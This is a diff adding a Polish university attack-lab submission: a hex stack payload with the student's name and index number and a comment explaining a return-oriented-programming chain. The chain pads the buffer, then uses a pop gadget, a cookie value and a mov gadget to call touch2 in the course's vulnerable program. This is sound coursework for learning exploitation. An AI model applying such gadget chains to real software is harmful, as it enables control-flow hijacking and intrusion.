@@ -1,0 +1,24 @@
+/* 
+ * Oświadczam, że zapoznałem(-am) się z regulaminem prowadzenia zajęć
+ * i jestem świadomy(-a) konsekwencji niestosowania się do podanych tam zasad.
+ *
+ * Imię i nazwisko, numer indeksu: Krzysztof Chmiel, 316749
+ *
+ * Poniżej należy podać i wyjaśnić zawartość wkładaną na stos programu.
+ */
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+6c 1d 40 00 00 00 00 00 
+8c 14 fd 24 00 00 00 00 
+5d 1d 40 00 00 00 00 00 
+ec 1b 40 00 00 00 00 00
+
+/*
+ * Pierwsze pięć linii to znów zapychacz bufora, potem mamy adres funkcji-gadżetu, która koduje popq %rax, następnie w kolejnej linijce
+ * jest ciastko (tym razem nie w ascii), a potem mamy znów adres do gadżetu, który robi nic innego jak mov rax rdi, no i na koncu
+ adres poczatku touch2. Przy tworzeniu tych movów, popów itd korzystamy z danej nam farmy i tablek z treści zadania.
+ */
